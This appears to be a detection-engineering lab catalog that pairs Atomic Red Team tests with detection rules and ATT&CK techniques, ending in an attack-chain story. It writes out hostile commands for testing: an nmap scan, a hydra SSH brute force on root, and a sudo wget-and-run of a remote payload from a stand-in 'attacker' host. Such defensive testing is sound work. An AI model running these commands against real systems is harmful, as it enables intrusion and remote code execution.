# Atomic test catalog

Each row: an Atomic Red Team test → the detection it should trigger → the ATT&CK
technique it exercises. Run top to bottom to reproduce the full attack chain the
lab's sample telemetry and triage scenarios are built around.

| # | Technique | Atomic / command | Should trigger | Expected outcome |
|---|-----------|------------------|----------------|------------------|
| 1 | T1046 Network Service Discovery | `nmap -sS -p- 10.0.0.5` | `net_port_scan.yml` | Many S0 connections from one source → port-scan alert |
| 2 | T1110.001 Password Guessing (SSH) | `hydra -l root -P wordlist ssh://10.0.0.5` | `lnx_ssh_bruteforce.yml` | 9+ failed SSH auths in 2m → brute-force alert |
| 3 | T1110 Brute Force (Windows) | `Invoke-AtomicTest T1110.001` | `win_failed_logon_bruteforce.yml` | 6+ Event ID 4625 from one source → alert |
| 4 | T1105 / T1059.004 Ingress + Exec | `sudo wget http://attacker/x.sh && sudo bash /tmp/x.sh` | `lnx_sudo_remote_payload.yml` | Sudo pulling/running a remote payload → alert |
| 5 | T1543.003 Windows Service | `Invoke-AtomicTest T1543.003` | `win_service_install.yml` | Event ID 7045 → new-service alert |
| 6 | T1136.001 / T1098 New Admin | `Invoke-AtomicTest T1136.001` | `win_new_admin_account.yml` | 4720 + 4728 → account-creation/escalation alert |
| 7 | T1071 / T1571 C2 Beacon | Caldera HTTP agent on tcp/4444 | `net_c2_beacon.yml` | Repeated beacons to uncommon port → C2 alert |

## End-to-end attack story

Running tests 1 → 2 → 4 → 7 in sequence reproduces the incident the triage assistant
investigates and the kill-chain narrative in `../detections/mitre_coverage.md`:

```
nmap scan ─▶ SSH brute force ─▶ successful root login ─▶ pull + run /tmp/x.sh ─▶ beacon to :4444
  (T1046)        (T1110.001)                              (T1105/T1059.004)        (T1571)
```

## Recording results

After each run, note in `../detections/mitre_coverage.md` whether the detection
fired and any false positives that needed tuning. That tuning history is the
evidence of detection-engineering work — keep it.
